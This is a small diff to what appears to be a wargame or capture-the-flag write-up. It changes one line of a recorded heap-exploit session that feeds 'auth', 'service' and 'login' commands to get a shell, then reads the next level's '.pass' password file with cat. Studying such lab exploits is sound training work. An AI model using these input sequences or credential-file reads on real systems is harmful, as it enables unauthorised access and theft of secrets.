@@ -53,7 +53,7 @@ then we can satisfy the condition of login and spawn a shell
     (nil), (nil) 
     auth hh
     0x804a008, (nil) 
-    service ahgdbghbnjkjhyth
+    service ahgdbghbnjkjhyt
     0x804a008, 0x804a018 
     login
     $ cat /home/user/level9/.pass 
